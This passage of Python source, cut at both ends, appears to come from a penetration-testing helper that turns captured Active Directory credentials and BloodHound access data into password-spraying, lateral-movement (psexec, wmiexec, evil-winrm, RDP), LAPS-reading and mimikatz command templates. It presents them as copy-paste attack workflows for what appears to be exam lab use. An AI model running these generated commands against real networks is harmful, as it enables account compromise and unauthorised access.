) -> tuple:
    """
    Generate Password Spray Recommendations section for the report.

    Returns both console-formatted and markdown-formatted output.
    Designed for integration with run_all_queries() report generation.

    Args:
        pwned_users: List of PwnedUser objects with credentials
        policy: Optional PasswordPolicy for safe spray planning
        domain: Domain name for command templates
        dc_ip: Domain Controller IP
        use_colors: Enable ANSI colors for console output

    Returns:
        Tuple of (console_output: str, markdown_output: str)
        Returns ("", "") if no pwned users with passwords
    """
    from .command_mappings import (
        SPRAY_TECHNIQUES,
        SPRAY_SCENARIOS,
        USER_ENUM_COMMANDS,
        PASSWORD_LIST_COMMANDS,
        PASSWORD_LIST_SCENARIOS,
        SPRAY_ONELINERS,
    )

    c = Colors if use_colors else _NoColors
    pwned_users = pwned_users or []

    # Extract credentials from pwned users
    passwords, usernames = extract_creds_from_pwned_users(pwned_users)

    # Only show section if we have passwords to spray with
    if not passwords:
        return "", ""

    console_lines = []
    markdown_lines = []

    # Local wrapper for fill_spray_template with captured context
    def fill_template(cmd: str, pwd: str = "<PASSWORD>") -> str:
        return fill_spray_template(cmd, dc_ip, domain, pwd, usernames)

    # =========================================================================
    # HEADER
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}{'='*78}{c.RESET}")
    console_lines.append(f"  {c.BOLD}PASSWORD SPRAYING METHODS{c.RESET}")
    if pwned_users:
        user_list = ", ".join(u.username for u in pwned_users[:5])
        if len(pwned_users) > 5:
            user_list += f" (+{len(pwned_users)-5} more)"
        console_lines.append(f"  {c.DIM}Based on captured credentials: {user_list}{c.RESET}")
    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")

    markdown_lines.append("## Password Spraying Methods")
    markdown_lines.append("")
    if pwned_users:
        user_list = ", ".join(u.username for u in pwned_users[:5])
        if len(pwned_users) > 5:
            user_list += f" (+{len(pwned_users)-5} more)"
        markdown_lines.append(f"*Based on captured credentials: {user_list}*")
        markdown_lines.append("")

    # =========================================================================
    # PASSWORD POLICY SECTION
    # =========================================================================
    console_lines.append("")
    if policy:
        console_lines.append(f"  {c.YELLOW}{c.BOLD}PASSWORD POLICY{c.RESET} {c.DIM}(from stored config){c.RESET}")
        console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
        console_lines.append(f"    Lockout threshold:   {policy.lockout_threshold} attempts" +
              (" (no lockout)" if policy.lockout_threshold == 0 else ""))
        console_lines.append(f"    Lockout duration:    {policy.lockout_duration} minutes")
        console_lines.append(f"    Observation window:  {policy.observation_window} minutes")
        console_lines.append("")
        console_lines.append(f"  {c.GREEN}{c.BOLD}SAFE SPRAY PARAMETERS{c.RESET}")
        console_lines.append(f"    Attempts per round:  {c.BOLD}{policy.safe_spray_attempts}{c.RESET}")
        console_lines.append(f"    Delay between:       {c.BOLD}{policy.spray_delay_minutes} minutes{c.RESET}")

        if policy.lockout_threshold == 0:
            console_lines.append(f"    {c.RED}WARNING: No lockout policy detected - exercise caution anyway{c.RESET}")

        markdown_lines.append("### Password Policy")
        markdown_lines.append("")
        markdown_lines.append("| Setting | Value |")
        markdown_lines.append("|---------|-------|")
        markdown_lines.append(f"| Lockout threshold | {policy.lockout_threshold} attempts |")
        markdown_lines.append(f"| Lockout duration | {policy.lockout_duration} minutes |")
        markdown_lines.append(f"| Observation window | {policy.observation_window} minutes |")
        markdown_lines.append("")
        markdown_lines.append("**Safe Spray Parameters:**")
        markdown_lines.append(f"- Attempts per round: **{policy.safe_spray_attempts}**")
        markdown_lines.append(f"- Delay between: **{policy.spray_delay_minutes} minutes**")
        markdown_lines.append("")
    else:
        console_lines.append(f"  {c.YELLOW}No password policy stored.{c.RESET}")
        console_lines.append(f"  Import with: {c.GREEN}crack bloodtrail --set-policy{c.RESET}")
        # Find first pwned user with a password credential
        hint_user, hint_pass = "<USER>", "<PASSWORD>"
        for user in pwned_users:
            for ctype, cval in zip(user.cred_types, user.cred_values):
                if ctype == "password" and cval:
                    hint_user = user.username
                    hint_pass = cval
                    break
            if hint_pass != "<PASSWORD>":
                break
        console_lines.append(f"  Set policy: {c.GREEN}crackmapexec smb {dc_ip} -u '{hint_user}' -p '{hint_pass}' --pass-pol | crack bt --set-policy{c.RESET}")
        console_lines.append("")
        console_lines.append(f"  {c.DIM}Default safe parameters (conservative):{c.RESET}")
        console_lines.append(f"    Attempts per round:  {c.BOLD}2{c.RESET}")
        console_lines.append(f"    Delay between:       {c.BOLD}30 minutes{c.RESET}")

        markdown_lines.append("### Password Policy")
        markdown_lines.append("")
        markdown_lines.append("*No password policy stored. Import with: `crack bloodtrail --set-policy`*")
        markdown_lines.append("")
        markdown_lines.append(f"Set policy: `crackmapexec smb {dc_ip} -u '{hint_user}' -p '{hint_pass}' --pass-pol | crack bt --set-policy`")
        markdown_lines.append("")
        markdown_lines.append("**Default safe parameters (conservative):**")
        markdown_lines.append("- Attempts per round: **2**")
        markdown_lines.append("- Delay between: **30 minutes**")
        markdown_lines.append("")

    # =========================================================================
    # SPRAY METHODS
    # =========================================================================
    methods = [
        ("smb", "METHOD 1"),
        ("kerberos", "METHOD 2"),
        ("ldap", "METHOD 3"),
    ]

    markdown_lines.append("### Spray Methods")
    markdown_lines.append("")

    for method_key, method_label in methods:
        tech = SPRAY_TECHNIQUES.get(method_key)
        if not tech:
            continue

        console_lines.append("")
        console_lines.append(f"  {c.CYAN}{c.BOLD}{method_label}: {tech.name}{c.RESET}")
        console_lines.append(f"  {c.DIM}Ports: {', '.join(str(p) for p in tech.ports)} | Noise: {tech.noise_level.upper()}{c.RESET}")
        console_lines.append("")

        markdown_lines.append(f"#### {method_label}: {tech.name}")
        markdown_lines.append(f"*Ports: {', '.join(str(p) for p in tech.ports)} | Noise: {tech.noise_level.upper()}*")
        markdown_lines.append("")

        # Commands with captured passwords
        template_key = "single_password" if method_key != "ldap" else "spray_ps1"
        template = tech.command_templates.get(template_key, "")

        if template:
            markdown_lines.append("```bash")
            if passwords and method_key != "ldap":
                for pwd in passwords[:3]:
                    cmd = fill_template(template, pwd)
                    console_lines.append(f"    {c.GREEN}{cmd}{c.RESET}")
                    markdown_lines.append(cmd)
            else:
                pwd = passwords[0] if passwords else "<PASSWORD>"
                cmd = fill_template(template, pwd)
                console_lines.append(f"    {c.GREEN}{cmd}{c.RESET}")
                markdown_lines.append(cmd)
            markdown_lines.append("```")
            markdown_lines.append("")

        console_lines.append("")
        console_lines.append(f"    {c.GREEN}+ {tech.advantages}{c.RESET}")
        console_lines.append(f"    {c.RED}- {tech.disadvantages}{c.RESET}")

        markdown_lines.append(f"- **+** {tech.advantages}")
        markdown_lines.append(f"- **-** {tech.disadvantages}")
        markdown_lines.append("")

    # =========================================================================
    # USER ENUMERATION COMMANDS
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}USER LIST GENERATION{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")

    markdown_lines.append("### User List Generation")
    markdown_lines.append("")

    linux_cmds = USER_ENUM_COMMANDS.get("linux", {})
    windows_cmds = USER_ENUM_COMMANDS.get("windows", {})

    console_lines.append("")
    console_lines.append(f"  {c.BOLD}From Linux (Kali):{c.RESET}")

    markdown_lines.append("**From Linux (Kali):**")
    markdown_lines.append("")

    first_pwd = passwords[0] if passwords else "<PASSWORD>"
    for key in ["kerbrute_enum", "crackmapexec_users", "bloodhound_export"]:
        if key in linux_cmds:
            cmd = linux_cmds[key]
            filled = fill_template(cmd["cmd"], first_pwd)
            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
            console_lines.append(f"    {c.GREEN}{filled}{c.RESET}")
            console_lines.append("")

            markdown_lines.append(f"```bash")
            markdown_lines.append(f"# {cmd['description']}")
            markdown_lines.append(filled)
            markdown_lines.append("```")
            markdown_lines.append("")

    console_lines.append(f"  {c.BOLD}From Windows (on target):{c.RESET}")
    markdown_lines.append("**From Windows (on target):**")
    markdown_lines.append("")

    for key in ["domain_users_to_file", "powershell_ad"]:
        if key in windows_cmds:
            cmd = windows_cmds[key]
            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
            console_lines.append(f"    {c.GREEN}{cmd['cmd']}{c.RESET}")
            console_lines.append("")

            markdown_lines.append(f"```powershell")
            markdown_lines.append(f"# {cmd['description']}")
            markdown_lines.append(cmd['cmd'])
            markdown_lines.append("```")
            markdown_lines.append("")

    # =========================================================================
    # PASSWORD LIST GENERATION COMMANDS
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}PASSWORD LIST GENERATION{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")

    markdown_lines.append("### Password List Generation")
    markdown_lines.append("")

    pwd_linux_cmds = PASSWORD_LIST_COMMANDS.get("linux", {})
    pwd_windows_cmds = PASSWORD_LIST_COMMANDS.get("windows", {})

    console_lines.append("")
    console_lines.append(f"  {c.BOLD}From Linux (Kali):{c.RESET}")

    markdown_lines.append("**From Linux (Kali):**")
    markdown_lines.append("")

    for key in ["bloodhound_passwords", "bloodhound_user_pass", "hashcat_potfile", "john_potfile", "cewl_wordlist", "mutation_rules"]:
        if key in pwd_linux_cmds:
            cmd = pwd_linux_cmds[key]
            filled = fill_template(cmd["cmd"], first_pwd)
            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
            console_lines.append(f"    {c.GREEN}{filled}{c.RESET}")
            console_lines.append("")

            markdown_lines.append(f"```bash")
            markdown_lines.append(f"# {cmd['description']}")
            markdown_lines.append(filled)
            markdown_lines.append("```")
            markdown_lines.append("")

    console_lines.append(f"  {c.BOLD}From Windows (on target):{c.RESET}")
    markdown_lines.append("**From Windows (on target):**")
    markdown_lines.append("")

    for key in ["mimikatz_extract"]:
        if key in pwd_windows_cmds:
            cmd = pwd_windows_cmds[key]
            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
            console_lines.append(f"    {c.GREEN}{cmd['cmd']}{c.RESET}")
            console_lines.append("")

            markdown_lines.append(f"```powershell")
            markdown_lines.append(f"# {cmd['description']}")
            markdown_lines.append(cmd['cmd'])
            markdown_lines.append("```")
            markdown_lines.append("")

    # Password list scenario recommendations table
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}Password List Scenarios:{c.RESET}")
    console_lines.append(f"  {'Scenario':<40} {'Method':<22} {'Reason'}")
    console_lines.append(f"  {'-'*40} {'-'*22} {'-'*35}")

    markdown_lines.append("**Password List Scenarios:**")
    markdown_lines.append("")
    markdown_lines.append("| Scenario | Method | Reason |")
    markdown_lines.append("|----------|--------|--------|")

    for scenario in PASSWORD_LIST_SCENARIOS:
        s = scenario["scenario"][:38]
        m = scenario["method"]
        r = scenario["reason"][:33]
        console_lines.append(f"  {s:<40} {c.BOLD}{m:<22}{c.RESET} {c.DIM}{r}{c.RESET}")
        markdown_lines.append(f"| {scenario['scenario']} | **{m}** | {scenario['reason']} |")

    markdown_lines.append("")

    # =========================================================================
    # SCENARIO RECOMMENDATIONS
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}SCENARIO RECOMMENDATIONS{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
    console_lines.append("")

    # Table header
    console_lines.append(f"  {'Scenario':<42} {'Method':<12} {'Reason'}")
    console_lines.append(f"  {'-'*42} {'-'*12} {'-'*40}")

    markdown_lines.append("### Scenario Recommendations")
    markdown_lines.append("")
    markdown_lines.append("| Scenario | Method | Reason |")
    markdown_lines.append("|----------|--------|--------|")

    for scenario in SPRAY_SCENARIOS:
        s = scenario["scenario"][:40]
        m = scenario["recommendation"]
        r = scenario["reason"][:38]
        console_lines.append(f"  {s:<42} {c.BOLD}{m:<12}{c.RESET} {c.DIM}{r}{c.RESET}")
        markdown_lines.append(f"| {scenario['scenario']} | **{m}** | {scenario['reason']} |")

    markdown_lines.append("")

    # =========================================================================
    # QUICK REFERENCE TABLE
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}QUICK REFERENCE: When to Use Each{c.RESET}")
    console_lines.append("")

    w_method, w_noise, w_speed, w_admin = 16, 8, 10, 12

    console_lines.append(f"  {c.DIM}+{'-'*w_method}+{'-'*w_noise}+{'-'*w_speed}+{'-'*w_admin}+{c.RESET}")
    console_lines.append(f"  {c.DIM}|{c.RESET}{'Method':^{w_method}}{c.DIM}|{c.RESET}{'Noise':^{w_noise}}{c.DIM}|{c.RESET}{'Speed':^{w_speed}}{c.DIM}|{c.RESET}{'Admin Check':^{w_admin}}{c.DIM}|{c.RESET}")
    console_lines.append(f"  {c.DIM}+{'-'*w_method}+{'-'*w_noise}+{'-'*w_speed}+{'-'*w_admin}+{c.RESET}")

    rows = [
        ("SMB (CME)", "HIGH", "Medium", "YES"),
        ("Kerberos", "LOW", "Fast", "No"),
        ("LDAP/ADSI", "MEDIUM", "Slow", "No"),
    ]

    for method, noise, speed, admin in rows:
        if noise == "HIGH":
            noise_colored = f"{c.RED}{noise:^{w_noise}}{c.RESET}"
        elif noise == "MEDIUM":
            noise_colored = f"{c.YELLOW}{noise:^{w_noise}}{c.RESET}"
        else:
            noise_colored = f"{c.GREEN}{noise:^{w_noise}}{c.RESET}"

        if admin == "YES":
            admin_colored = f"{c.GREEN}{admin:^{w_admin}}{c.RESET}"
        else:
            admin_colored = f"{admin:^{w_admin}}"

        if speed == "Fast":
            speed_colored = f"{c.GREEN}{speed:^{w_speed}}{c.RESET}"
        else:
            speed_colored = f"{speed:^{w_speed}}"

        console_lines.append(f"  {c.DIM}|{c.RESET}{method:^{w_method}}{c.DIM}|{c.RESET}{noise_colored}{c.DIM}|{c.RESET}{speed_colored}{c.DIM}|{c.RESET}{admin_colored}{c.DIM}|{c.RESET}")

    console_lines.append(f"  {c.DIM}+{'-'*w_method}+{'-'*w_noise}+{'-'*w_speed}+{'-'*w_admin}+{c.RESET}")

    markdown_lines.append("### Quick Reference")
    markdown_lines.append("")
    markdown_lines.append("| Method | Noise | Speed | Admin Check |")
    markdown_lines.append("|--------|-------|-------|-------------|")
    markdown_lines.append("| SMB (CME) | HIGH | Medium | YES |")
    markdown_lines.append("| Kerberos | LOW | Fast | No |")
    markdown_lines.append("| LDAP/ADSI | MEDIUM | Slow | No |")
    markdown_lines.append("")

    # =========================================================================
    # SPRAY ONE-LINERS
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}SPRAY ONE-LINERS{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
    console_lines.append(f"  {c.DIM}Complete attack workflows - copy/paste ready{c.RESET}")
    console_lines.append("")

    markdown_lines.append("### Spray One-Liners")
    markdown_lines.append("")
    markdown_lines.append("Complete attack workflows - copy/paste ready:")
    markdown_lines.append("")

    for i, oneliner in enumerate(SPRAY_ONELINERS, 1):
        name = oneliner["name"]
        desc = oneliner["description"]
        cmd = fill_template(oneliner["cmd"], first_pwd)

        # Console output
        console_lines.append(f"  {c.BOLD}{i}. {name}{c.RESET}")
        console_lines.append(f"     {c.DIM}{desc}{c.RESET}")
        console_lines.append(f"     {c.GREEN}{cmd}{c.RESET}")
        console_lines.append("")

        # Markdown output
        markdown_lines.append(f"**{i}. {name}**")
        markdown_lines.append(f"")
        markdown_lines.append(f"_{desc}_")
        markdown_lines.append("")
        markdown_lines.append("```bash")
        markdown_lines.append(cmd)
        markdown_lines.append("```")
        markdown_lines.append("")

    # =========================================================================
    # EXAM TIP
    # =========================================================================
    console_lines.append("")
    threshold = policy.lockout_threshold if policy else 5
    safe = policy.safe_spray_attempts if policy else 4
    window = policy.spray_delay_minutes if policy else 30
    console_lines.append(f"  {c.YELLOW}{c.BOLD}EXAM TIP:{c.RESET} Before spraying, always check {c.GREEN}net accounts{c.RESET} to verify lockout.")
    console_lines.append(f"  {c.DIM}With {threshold}-attempt lockout, safely attempt {safe} passwords per {window} min window.{c.RESET}")

    console_lines.append("")
    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
    console_lines.append("")

    markdown_lines.append(f"> **EXAM TIP:** Before spraying, always check `net accounts` to verify lockout.")
    markdown_lines.append(f"> With {threshold}-attempt lockout, safely attempt {safe} passwords per {window} min window.")
    markdown_lines.append("")

    return "\n".join(console_lines), "\n".join(markdown_lines)


# =============================================================================
# TAILORED SPRAY COMMANDS (Based on BloodHound Access Data)
# =============================================================================

# Protocol mapping for each access type
ACCESS_TYPE_PROTOCOLS = {
    "AdminTo": {
        "name": "Local Admin",
        "protocols": [
            {"name": "SMB (CrackMapExec)", "cmd": "crackmapexec smb {targets} -u {users} -p '<PASSWORD>'", "single": "crackmapexec smb {target} -u {user} -p '<PASSWORD>'"},
            {"name": "WinRM (evil-winrm)", "cmd": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'", "single": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'"},
            {"name": "PSExec", "cmd": "impacket-psexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-psexec '{domain}/{user}:<PASSWORD>'@{target}"},
            {"name": "WMIExec", "cmd": "impacket-wmiexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-wmiexec '{domain}/{user}:<PASSWORD>'@{target}"},
        ],
    },
    "CanRDP": {
        "name": "RDP Access",
        "protocols": [
            {"name": "xfreerdp", "cmd": "xfreerdp /v:{target} /u:{user} /p:'<PASSWORD>' /cert:ignore", "single": "xfreerdp /v:{target} /u:{user} /p:'<PASSWORD>' /cert:ignore"},
            {"name": "rdesktop", "cmd": "rdesktop -u {user} -p '<PASSWORD>' {target}", "single": "rdesktop -u {user} -p '<PASSWORD>' {target}"},
        ],
    },
    "CanPSRemote": {
        "name": "PS Remoting",
        "protocols": [
            {"name": "WinRM (evil-winrm)", "cmd": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'", "single": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'"},
            {"name": "WinRM (CrackMapExec)", "cmd": "crackmapexec winrm {targets} -u {users} -p '<PASSWORD>'", "single": "crackmapexec winrm {target} -u {user} -p '<PASSWORD>'"},
        ],
    },
    "ExecuteDCOM": {
        "name": "DCOM Execution",
        "protocols": [
            {"name": "DCOMExec", "cmd": "impacket-dcomexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-dcomexec '{domain}/{user}:<PASSWORD>'@{target}"},
        ],
    },
    "ReadLAPSPassword": {
        "name": "LAPS Password",
        "protocols": [
            {"name": "LDAP Query", "cmd": "crackmapexec ldap {target} -u {user} -p '<PASSWORD>' -M laps", "single": "crackmapexec ldap {target} -u {user} -p '<PASSWORD>' -M laps"},
            {"name": "LAPSDumper", "cmd": "python3 laps.py -u {user} -p '<PASSWORD>' -d {domain}", "single": "python3 laps.py -u {user} -p '<PASSWORD>' -d {domain}"},
        ],
    },
}

# Monolithic spray: Priority order and protocol-specific commands
# Each user sprayed once on their highest-privilege target
ACCESS_PRIORITY = ["AdminTo", "CanPSRemote", "CanRDP", "ExecuteDCOM", "ReadLAPSPassword"]

MONOLITHIC_PROTOCOLS = {
    # access_type: (tool_name, command_template)
    "AdminTo": ("crackmapexec smb", 'crackmapexec smb {target} -u {user} -p "$PASSWORD"'),
    "CanPSRemote": ("evil-winrm", 'evil-winrm -i {target} -u {user} -p "$PASSWORD"'),
    "CanRDP": ("xfreerdp3", 'xfreerdp3 /v:{target} /u:{user} /p:"$PASSWORD" /cert:ignore'),
    "ExecuteDCOM": ("dcomexec", "impacket-dcomexec '{domain}/{user}:$PASSWORD'@{target}"),
    "ReadLAPSPassword": ("crackmapexec ldap", 'crackmapexec ldap {target} -u {user} -p "$PASSWORD" -M laps'),
}

EDGE_DESCRIPTIONS = {
    "AdminTo": "local admin → SMB auth",
    "CanPSRemote": "WinRM → evil-winrm auth",
    "CanRDP": "RDP → xfreerdp3 auth",
    "ExecuteDCOM": "DCOM → dcomexec auth",
    "ReadLAPSPassword": "LAPS read → ldap query",
}


def _extract_username(upn: str) -> str:
    """Extract username from UPN format (USER@DOMAIN.COM -> user)."""
    if "@" in upn:
        return upn.split("@")[0].lower()
    return upn.lower()


def _extract_domain(upn: str) -> str:
    """Extract domain from UPN format (USER@DOMAIN.COM -> DOMAIN.COM)."""
    if "@" in upn:
        return upn.split("@")[1]
    return ""


def _extract_short_hostname(fqdn: str) -> str:
    """Extract short hostname from FQDN (CLIENT74.CORP.COM -> CLIENT74)."""
    if "." in fqdn:
        return fqdn.split(".")[0]
    return fqdn


def _select_best_target_for_user(user_access: dict) -> dict:
    """
    Select the best target for a user based on access type priority.

    Args:
        user_access: {access_type: [(computer, ip, inherited_from), ...]}

    Returns:
        {
            "access_type": str,
            "computer": str,
            "ip": str or None,
            "inherited_from": str or None,
            "had_rdp_but_skipped": bool  # True if user had RDP but we chose better
        }
    """
    had_rdp = "CanRDP" in user_access
    non_rdp_types = [t for t in user_access.keys() if t != "CanRDP"]
    had_better_than_rdp = len(non_rdp_types) > 0

    # Check each access type in priority order
    for access_type in ACCESS_PRIORITY:
        # Skip CanRDP if user has any other access type
        if access_type == "CanRDP" and had_better_than_rdp:
            continue

        if access_type in user_access and user_access[access_type]:
            # Get targets for this access type, pick first alphabetically
            targets = sorted(user_access[access_type], key=lambda x: x[0])
            computer, ip, inherited_from = targets[0]

            return {
                "access_type": access_type,
                "computer": computer,
                "ip": ip,
                "inherited_from": inherited_from,
                "had_rdp_but_skipped": had_rdp and had_better_than_rdp and access_type != "CanRDP",
            }

    return None


def _group_by_common_targets(user_targets: dict, access_type: str) -> list:
    """
    Group users by common target subsets.

    Args:
        user_targets: {username: set(targets)} for a specific access type
        access_type: The access type being processed

    Returns:
        List of groups: [{users: [u1, u2], targets: [t1, t2], target_ips: {t1: ip1}}]
    """
    if not user_targets:
        return []

    groups = []

    # Convert to list for iteration
    users = list(user_targets.keys())
    target_sets = {u: set(t for t, ip in targets) for u, targets in user_targets.items()}
    ip_mapping = {}
    for u, targets in user_targets.items():
        for t, ip in targets:
            if ip:
                ip_mapping[t] = ip

    # Find unique target set combinations and group users
    processed_target_sets = {}

    for user in users:
        targets_frozen = frozenset(target_sets[user])
        if targets_frozen not in processed_target_sets:
            processed_target_sets[targets_frozen] = []
        processed_target_sets[targets_frozen].append(user)

    # Convert to group list
    for targets_frozen, group_users in processed_target_sets.items():
        targets_list = sorted(list(targets_frozen))
        target_ips = {t: ip_mapping.get(t) for t in targets_list}
        groups.append({
            "users": sorted(group_users),
            "targets": targets_list,
            "target_ips": target_ips,
        })

    # Now find subset relationships for additional grouping
    # Sort by target set size (largest first)
    groups.sort(key=lambda g: (-len(g["targets"]), -len(g["users"])))

    return groups


def _generate_monolithic_spray(
    access_data: list,
    domain: str = "",
    use_colors: bool = True,
) -> tuple:
    """
    Generate monolithic spray commands - one attempt per user on their best target.

    Args:
        access_data: List from get_all_users_with_access() with inherited_from field
        domain: Domain name for command templates
        use_colors: Enable ANSI colors

    Returns:
        Tuple of (console_lines, markdown_lines)
    """
    c = Colors if use_colors else _NoColors

    console_lines = []
    markdown_lines = []

    if not access_data:
        return [], []

    # Phase 1: Build user -> access_type -> [(computer, ip, inherited_from)] mapping
    user_all_access = {}
    for entry in access_data:
        user = _extract_username(entry["user"])
        computer = entry["computer"]
        access_type = entry["access_type"]
        ip = entry.get("ip")
        inherited_from = entry.get("inherited_from")

        if user not in user_all_access:
            user_all_access[user] = {}
        if access_type not in user_all_access[user]:
            user_all_access[user][access_type] = []
        user_all_access[user][access_type].append((computer, ip, inherited_from))

    # Phase 2: Select best target for each user
    user_selections = {}
    edge_counts = {at: 0 for at in ACCESS_PRIORITY}
    rdp_avoided_count = 0

    for user, access_dict in user_all_access.items():
        selection = _select_best_target_for_user(access_dict)
        if selection:
            user_selections[user] = selection
            edge_counts[selection["access_type"]] += 1
            if selection["had_rdp_but_skipped"]:
                rdp_avoided_count += 1

    if not user_selections:
        return [], []

    # Phase 3: Generate header and edge selection logic
    console_lines.append("")
    console_lines.append(f"  {c.CYAN}{c.BOLD}{'='*74}{c.RESET}")
    console_lines.append(f"  {c.BOLD}MONOLITHIC SPRAY{c.RESET}")
    console_lines.append(f"  {c.DIM}One attempt per user on their best target - set password once{c.RESET}")
    console_lines.append(f"  {c.CYAN}{'='*74}{c.RESET}")

    markdown_lines.append("## Monolithic Spray")
    markdown_lines.append("")
    markdown_lines.append("One attempt per user on their best target. Set `PASSWORD` once at the top.")
    markdown_lines.append("")

    # Edge Selection Logic block
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}EDGE SELECTION LOGIC (this report):{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*40}{c.RESET}")

    markdown_lines.append("### Edge Selection Logic")
    markdown_lines.append("")
    markdown_lines.append("```")

    for access_type in ACCESS_PRIORITY:
        count = edge_counts[access_type]
        if count > 0 or access_type == "CanRDP":
            desc = EDGE_DESCRIPTIONS.get(access_type, access_type)
            user_word = "user" if count == 1 else "users"

            if access_type == "CanRDP" and rdp_avoided_count > 0:
                line = f"  {count} {user_word} via {access_type} ({desc}) - {rdp_avoided_count} avoided (had better options)"
            else:
                line = f"  {count} {user_word} via {access_type} ({desc})"

            console_lines.append(f"  {c.DIM}{line}{c.RESET}")
            markdown_lines.append(line)

    console_lines.append(f"  {c.DIM}  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword{c.RESET}")
    console_lines.append(f"  {c.DIM}  Each user sprayed exactly once on their highest-privilege target{c.RESET}")

    markdown_lines.append("  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword")
    markdown_lines.append("  Each user sprayed exactly once on their highest-privilege target")
    markdown_lines.append("```")
    markdown_lines.append("")

    # Phase 4: Generate the bash script block
    console_lines.append("")
    console_lines.append(f"  {c.BOLD}Copy-paste command block:{c.RESET}")
    console_lines.append("")

    markdown_lines.append("### Commands")
    markdown_lines.append("")
    markdown_lines.append("```bash")

    # PASSWORD variable
    console_lines.append(f"  {c.GREEN}PASSWORD='<PASSWORD>'{c.RESET}")
    console_lines.append("")
    markdown_lines.append("PASSWORD='<PASSWORD>'")
    markdown_lines.append("")

    # Domain short name for commands
    domain_short = domain.split(".")[0] if domain else "<DOMAIN>"

    # Generate per-user commands
    for user in sorted(user_selections.keys()):
        sel = user_selections[user]
        access_type = sel["access_type"]
        computer = sel["computer"]
        ip = sel["ip"]
        inherited_from = sel["inherited_from"]

        # Target: prefer IP, fallback to short hostname
        target = ip if ip else _extract_short_hostname(computer)
        hostname_short = _extract_short_hostname(computer)

        # Build Cypher-style path comment
        if inherited_from:
            inherited_short = _extract_username(inherited_from) if "@" in str(inherited_from) else inherited_from
            cypher_path = f"MATCH ({user})-[:MemberOf*]->({inherited_short})-[:{access_type}]->({hostname_short})"
            access_note = f"{access_type} via {inherited_short}"
        else:
            cypher_path = f"MATCH ({user})-[:{access_type}]->({hostname_short})"
            access_note = f"{access_type} (direct)"

        # Get command template
        tool_name, cmd_template = MONOLITHIC_PROTOCOLS.get(access_type, ("unknown", "# unknown access type"))
        cmd = cmd_template.format(target=target, user=user, domain=domain_short)

        # Console output
        console_lines.append(f"  {c.DIM}# --- {user} → {target} ({hostname_short}) ---{c.RESET}")
        console_lines.append(f"  {c.DIM}# {access_note}: {cypher_path}{c.RESET}")

        # Add note if this user had RDP but we chose better
        if sel["had_rdp_but_skipped"]:
            console_lines.append(f"  {c.DIM}# Note: User also has CanRDP, using {access_type} instead{c.RESET}")

        console_lines.append(f"  {c.GREEN}{cmd}{c.RESET}")
        console_lines.append("")

        # Markdown output
        markdown_lines.append(f"# --- {user} → {target} ({hostname_short}) ---")
        markdown_lines.append(f"# {access_note}: {cypher_path}")
        if sel["had_rdp_but_skipped"]:
            markdown_lines.append(f"# Note: User also has CanRDP, using {access_type} instead")
        markdown_lines.append(cmd)
        markdown_lines.append("")

    markdown_lines.append("```")
    markdown_lines.append("")

    return console_lines, markdown_lines


def print_spray_tailored(
    access_data: list,
    domain: str = "",
    use_colors: bool = True,
) -> tuple:
    """
    Print tailored spray commands based on BloodHound access data.

    Groups users by identical machine access patterns to reduce redundancy.
    Shows both file-based and inline bash loop formats.
    NO TRUNCATION - prints everything.

    Args:
        access_data: List from get_all_users_with_access()
        domain: Domain name for command templates
        use_colors: Enable ANSI colors

    Returns:
        Tuple of (console_output, markdown_output)
    """
    c = Colors if use_colors else _NoColors

    console_lines = []
    markdown_lines = []

    # Build user -> {access_type -> set((target, ip))} mapping
    user_access = {}
    for entry in access_data:
        user = entry["user"]
        computer = entry["computer"]
        access_type = entry["access_type"]
        ip = entry.get("ip")

        if user not in user_access:
            user_access[user] = {}
        if access_type not in user_access[user]:
            user_access[user][access_type] = set()
        user_access[user][access_type].add((computer, ip))

    # Count statistics
    unique_users = len(user_access)
    unique_computers = len(set(e["computer"] for e in access_data))
    access_types_found = set(e["access_type"] for e in access_data)

    # =========================================================================
    # HEADER
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{c.BOLD}{'='*78}{c.RESET}")
    console_lines.append(f"  {c.BOLD}TAILORED SPRAY COMMANDS{c.RESET}")
    console_lines.append(f"  {c.DIM}Based on BloodHound access relationships{c.RESET}")
    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")

    markdown_lines.append("# Tailored Spray Commands")
    markdown_lines.append("")
    markdown_lines.append("Based on BloodHound access relationships - targeted commands for known valid access.")
    markdown_lines.append("")

    # =========================================================================
    # SUMMARY STATISTICS
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}SUMMARY{c.RESET}")
    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
